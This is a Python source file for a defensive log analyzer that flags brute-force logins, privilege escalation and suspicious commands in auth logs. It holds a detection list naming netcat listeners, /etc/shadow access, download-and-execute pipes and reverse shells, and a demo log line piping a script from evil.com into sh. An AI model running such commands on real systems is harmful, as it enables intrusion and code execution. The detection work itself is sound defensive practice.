#!/usr/bin/env python3
"""
Log Analyzer - Blue Team Tool
A simple log parser and analyzer for detecting suspicious patterns.

Designed for Blue Team practitioners to practice log analysis.

Features:
- Parse Windows Event Logs (text format) and Linux auth logs
- Detect brute force attempts (failed logins)
- Detect privilege escalation attempts
- Detect suspicious IP addresses
- Generate summary reports (text, JSON, CSV)
- Colored terminal output

Usage:
    python log_analyzer.py <logfile> [--output report.txt]
    python log_analyzer.py --demo
"""

import re
import csv
import json
import argparse
import sys
from collections import Counter
from datetime import datetime
from io import StringIO


# --- Terminal Colors ---

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colorize(text, color):
    """Apply color to text if terminal supports it."""
    if sys.stdout.isatty():
        return f"{color}{text}{Colors.RESET}"
    return text


# --- Pattern Definitions ---

FAILED_LOGIN_PATTERNS = [
    r"Failed password for .+ from (\d+\.\d+\.\d+\.\d+)",
    r"authentication failure.*rhost=(\S+)",
    r"Logon Failure.*Account Name:\s+(\S+)",
    r"EventID 4625.*Source Network Address:\s+(\d+\.\d+\.\d+\.\d+)",
    r"failed login.*from (\d+\.\d+\.\d+\.\d+)",
]

SUCCESS_LOGIN_PATTERNS = [
    r"Accepted .+ for .+ from (\d+\.\d+\.\d+\.\d+)",
    r"Session opened for user",
    r"EventID 4624.*Source Network Address:\s+(\d+\.\d+\.\d+\.\d+)",
    r"successful login.*from (\d+\.\d+\.\d+\.\d+)",
]

PRIV_ESCALATION_PATTERNS = [
    r"sudo:.+COMMAND=",
    r"privilege escalation",
    r"EventID 4672",
    r"su:.*session opened for user root",
]

SUSPICIOUS_PATTERNS = [
    (r"rm\s+-rf\s+/", "Potential destructive command"),
    (r"chmod\s+[0-7]*777", "Overly permissive file permissions"),
    (r"nc\s+-[elp]", "Netcat listener detected"),
    (r"/etc/shadow", "Shadow file access attempt"),
    (r"wget\s+.*\|.*sh", "Download and execute pattern"),
    (r"curl\s+.*\|.*bash", "Download and execute pattern"),
    (r"reverse shell", "Reverse shell keyword detected"),
    (r"powershell.*-enc", "Encoded PowerShell command"),
]


class LogAnalyzer:
    """Analyzes log files for suspicious security events."""

    def __init__(self):
        self.failed_logins = []
        self.success_logins = []
        self.priv_escalations = []
        self.suspicious_events = []
        self.failed_login_ips = Counter()
        self.success_login_ips = Counter()
        self.total_lines = 0

    def parse_line(self, line):
        """Parse a single log line and check for security events."""
        self.total_lines += 1
        line_stripped = line.strip()

        if not line_stripped:
            return

        for pattern in FAILED_LOGIN_PATTERNS:
            match = re.search(pattern, line_stripped, re.IGNORECASE)
            if match:
                ip = match.group(1) if match.lastindex else "unknown"
                self.failed_logins.append(line_stripped)
                self.failed_login_ips[ip] += 1
                return

        for pattern in SUCCESS_LOGIN_PATTERNS:
            match = re.search(pattern, line_stripped, re.IGNORECASE)
            if match:
                ip = match.group(1) if match.lastindex else "unknown"
                self.success_logins.append(line_stripped)
                self.success_login_ips[ip] += 1
                return

        for pattern in PRIV_ESCALATION_PATTERNS:
            if re.search(pattern, line_stripped, re.IGNORECASE):
                self.priv_escalations.append(line_stripped)
                return

        for pattern, description in SUSPICIOUS_PATTERNS:
            if re.search(pattern, line_stripped, re.IGNORECASE):
                self.suspicious_events.append({
                    "line": line_stripped,
                    "description": description,
                })
                return

    def analyze_file(self, filepath):
        """Analyze an entire log file."""
        try:
            with open(filepath, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    self.parse_line(line)
        except FileNotFoundError:
            print(colorize(f"[ERROR] File not found: {filepath}", Colors.RED))
            sys.exit(1)
        except PermissionError:
            print(colorize(f"[ERROR] Permission denied: {filepath}", Colors.RED))
            sys.exit(1)

    def get_brute_force_ips(self, threshold=5):
        """Return IPs with failed logins above the threshold."""
        return {ip: count for ip, count in self.failed_login_ips.items()
                if count >= threshold}

    def to_dict(self):
        """Convert analysis results to a dictionary."""
        brute_force = self.get_brute_force_ips()
        return {
            "generated": datetime.now().isoformat(),
            "summary": {
                "total_lines": self.total_lines,
                "failed_logins": len(self.failed_logins),
                "successful_logins": len(self.success_logins),
                "privilege_escalations": len(self.priv_escalations),
                "suspicious_events": len(self.suspicious_events),
            },
            "brute_force_ips": brute_force,
            "top_failed_ips": dict(self.failed_login_ips.most_common(10)),
            "top_success_ips": dict(self.success_login_ips.most_common(10)),
            "privilege_escalations": self.priv_escalations[:20],
            "suspicious_events": self.suspicious_events[:20],
        }

    def generate_report(self, use_color=True):
        """Generate a human-readable security report."""
        r = []
        header = "=" * 60
        r.append(colorize(header, Colors.CYAN))
        r.append(colorize("  LOG ANALYSIS SECURITY REPORT", Colors.BOLD + Colors.CYAN))
        r.append(colorize(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", Colors.CYAN))
        r.append(colorize(header, Colors.CYAN))
        r.append("")

        r.append(colorize("[SUMMARY]", Colors.BOLD))
        r.append(f"  Total lines analyzed:    {self.total_lines}")
        r.append(f"  Failed login attempts:   {colorize(str(len(self.failed_logins)), Colors.RED)}")
        r.append(f"  Successful logins:       {colorize(str(len(self.success_logins)), Colors.GREEN)}")
        r.append(f"  Privilege escalations:   {colorize(str(len(self.priv_escalations)), Colors.YELLOW)}")
        r.append(f"  Suspicious events:       {colorize(str(len(self.suspicious_events)), Colors.MAGENTA)}")
        r.append("")

        brute_force = self.get_brute_force_ips()
        if brute_force:
            r.append(colorize("[!] BRUTE FORCE DETECTED", Colors.BOLD + Colors.RED))
            r.append(f"  IPs with 5+ failed attempts:")
            for ip, count in sorted(brute_force.items(), key=lambda x: x[1], reverse=True):
                r.append(colorize(f"    - {ip}: {count} attempts", Colors.RED))
            r.append("")

        if self.failed_login_ips:
            r.append(colorize("[TOP FAILED LOGIN SOURCES]", Colors.BOLD + Colors.YELLOW))
            for ip, count in self.failed_login_ips.most_common(10):
                r.append(f"  {ip:>20}: {count} attempts")
            r.append("")

        if self.success_login_ips:
            r.append(colorize("[TOP SUCCESSFUL LOGIN SOURCES]", Colors.BOLD + Colors.GREEN))
            for ip, count in self.success_login_ips.most_common(10):
                r.append(f"  {ip:>20}: {count} logins")
            r.append("")

        if self.priv_escalations:
            r.append(colorize("[PRIVILEGE ESCALATION EVENTS]", Colors.BOLD + Colors.YELLOW))
            for event in self.priv_escalations[:20]:
                r.append(f"  > {event[:100]}")
            if len(self.priv_escalations) > 20:
                r.append(f"  ... and {len(self.priv_escalations) - 20} more")
            r.append("")

        if self.suspicious_events:
            r.append(colorize("[SUSPICIOUS EVENTS]", Colors.BOLD + Colors.MAGENTA))
            for event in self.suspicious_events[:20]:
                r.append(colorize(f"  [{event['description']}]", Colors.MAGENTA))
                r.append(f"    {event['line'][:100]}")
            if len(self.suspicious_events) > 20:
                r.append(f"  ... and {len(self.suspicious_events) - 20} more")
            r.append("")

        r.append(colorize(header, Colors.CYAN))
        r.append(colorize("  END OF REPORT", Colors.BOLD + Colors.CYAN))
        r.append(colorize(header, Colors.CYAN))

        return "\n".join(r)

    def generate_json(self):
        """Generate JSON report."""
        return json.dumps(self.to_dict(), indent=2)

    def generate_csv(self):
        """Generate CSV report of all events."""
        output = StringIO()
        writer = csv.writer(output)
        writer.writerow(["type", "source_ip", "details"])

        for ip, count in self.failed_login_ips.items():
            writer.writerow(["failed_login", ip, f"{count} attempts"])

        for ip, count in self.success_login_ips.items():
            writer.writerow(["success_login", ip, f"{count} logins"])

        for event in self.suspicious_events:
            writer.writerow(["suspicious", "", event["description"]])

        return output.getvalue()


def generate_demo_log():
    """Generate a sample log file for testing."""
    return """Jan 15 08:23:01 server sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:05 server sshd[1235]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:09 server sshd[1236]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:13 server sshd[1237]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:17 server sshd[1238]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:21 server sshd[1239]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:25 server sshd[1240]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:29 server sshd[1241]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:33 server sshd[1242]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:37 server sshd[1243]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:24:01 server sshd[1244]: Failed password for root from 10.0.0.50 port 22 ssh2
Jan 15 08:24:05 server sshd[1245]: Failed password for root from 10.0.0.50 port 22 ssh2
Jan 15 08:24:09 server sshd[1246]: Failed password for root from 10.0.0.50 port 22 ssh2
Jan 15 08:25:00 server sshd[1247]: Accepted password for admin from 172.16.0.5 port 22 ssh2
Jan 15 08:25:01 server sshd[1248]: pam_unix(sshd:session): session opened for user admin
Jan 15 08:30:00 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Jan 15 08:35:00 server kernel: chmod 777 /etc/shadow attempted by user admin
Jan 15 08:40:00 server bash[5678]: wget http://evil.com/malware.sh | sh
Jan 15 08:45:00 server sshd[1249]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:05 server sshd[1250]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:10 server sshd[1251]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:15 server sshd[1252]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:20 server sshd[1253]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:25 server sshd[1254]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:30 server sshd[1255]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:50:00 server sshd[1256]: Accepted publickey for deploy from 10.0.0.1 port 22 ssh2
Jan 15 09:00:00 server sudo: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
"""


def main():
    parser = argparse.ArgumentParser(
        description="Log Analyzer - Detect suspicious patterns in log files",
        epilog="Examples:\n"
               "  python log_analyzer.py /var/log/auth.log\n"
               "  python log_analyzer.py windows_events.log --output report.txt\n"
               "  python log_analyzer.py --demo --format json",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("logfile", nargs="?", help="Path to the log file to analyze")
    parser.add_argument("--output", "-o", help="Save report to a file")
    parser.add_argument("--demo", action="store_true", help="Run with demo data")
    parser.add_argument("--threshold", "-t", type=int, default=5,
                        help="Failed login threshold for brute force detection (default: 5)")
    parser.add_argument("--format", "-f", choices=["text", "json", "csv"], default="text",
                        help="Output format (default: text)")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")

    args = parser.parse_args()

    if args.no_color:
        Colors.RED = Colors.GREEN = Colors.YELLOW = Colors.BLUE = Colors.MAGENTA = Colors.CYAN = Colors.BOLD = ""
        Colors.RESET = ""

    analyzer = LogAnalyzer()

    if args.demo:
        print(colorize("[*] Running in demo mode with sample log data...", Colors.CYAN))
        demo_data = generate_demo_log()
        for line in demo_data.splitlines():
            analyzer.parse_line(line)
    elif args.logfile:
        print(colorize(f"[*] Analyzing: {args.logfile}", Colors.CYAN))
        analyzer.analyze_file(args.logfile)
    else:
        parser.print_help()
        sys.exit(1)

    if args.format == "json":
        report = analyzer.generate_json()
    elif args.format == "csv":
        report = analyzer.generate_csv()
    else:
        report = analyzer.generate_report()

    print(report)

    if args.output:
        with open(args.output, "w") as f:
            f.write(report)
        print(colorize(f"\n[*] Report saved to: {args.output}", Colors.GREEN))


if __name__ == "__main__":
    main()
